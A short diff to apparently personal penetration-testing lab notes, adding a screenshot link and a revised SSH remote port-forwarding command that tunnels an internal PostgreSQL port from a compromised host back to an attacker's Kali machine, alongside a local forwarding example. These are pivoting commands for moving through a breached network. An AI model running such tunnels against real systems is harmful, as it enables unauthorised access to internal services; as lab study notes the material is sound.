@@ -16,8 +16,10 @@ forward all packets which go to remote compromised machine:445 to 192.168.1.110:
 remote compromised machine: ssh -N -L 0.0.0.0(src CONFLUENCE01):445:192.168.1.110(dst PGDATABASE01):445 student@PGDATABASE01
 ```
 ###### ssh remote port forwarding
+![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/9355bdff-aa68-4989-aa53-0f3074a39739)
+
 ```
-remote compromised machine: ssh -N -R 192.168.163.52(src):5555(established listening state on this port):127.0.0.1(dst):12345 student@192.168.163.52(src credential) -p 2222
+remote compromised machine(confluence01): ssh -N -R 127.0.0.1(confluence01):2345:10.4.50.215(PGDATABASE01):5432 kali@192.168.118.4(attacker machine)
 ```
 ###### SSH Dynamic Port Forwarding
 ![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/f68cfac3-7e49-4f50-b104-ad7a672958e7)
